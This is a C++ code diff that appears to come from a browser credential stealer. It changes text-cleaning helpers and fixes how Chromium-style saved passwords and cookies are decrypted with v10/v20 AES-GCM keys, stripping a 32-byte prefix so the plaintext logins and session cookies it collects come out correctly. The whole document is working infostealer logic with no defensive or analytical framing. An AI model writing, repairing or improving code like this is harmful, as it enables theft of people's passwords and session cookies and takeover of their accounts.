@@ -34,10 +34,10 @@ std::string to_utf8_lossy(const std::vector<unsigned char>& input) {
     std::string output;
     output.reserve(input.size());
     for (unsigned char c : input) {
-        if (c < 128) {
-            output += (char)c;
+        if (c < 32 && c != '\r' && c != '\n' && c != '\t') {
+            output += ' ';
         } else {
-            output += '?';
+            output += (char)c;
         }
     }
     return output;
@@ -47,10 +47,8 @@ std::string ensure_utf8(const std::string& input) {
     std::string output;
     output.reserve(input.size());
     for (unsigned char c : input) {
-        if (c < 128) output += (char)c;
-        else {
-            output += '?';
-        }
+        if (c < 32 && c != '\r' && c != '\n' && c != '\t') output += ' ';
+        else output += (char)c;
     }
     return output;
 }
@@ -328,7 +326,10 @@ void do_work() {
                         auto& key = is_v20 ? v20_key : v10_key;
                         if (!key.empty()) {
                             auto dec = aes_gcm_decrypt(key, enc_pass);
-                            if (!dec.empty()) p_data.passwords.push_back({ url, user, to_utf8_lossy(dec) });
+                            if (!dec.empty()) {
+                                if (dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
+                                p_data.passwords.push_back({ url, user, to_utf8_lossy(dec) });
+                            }
                         }
                     }
                     sqlite3_finalize(stmt);
@@ -361,7 +362,7 @@ void do_work() {
                         if (!key.empty()) {
                             auto dec = aes_gcm_decrypt(key, enc_val);
                             if (!dec.empty()) {
-                                if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
+                                if (dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
                                 p_data.cookies.push_back({ host, name, to_utf8_lossy(dec) });
                             }
                         }
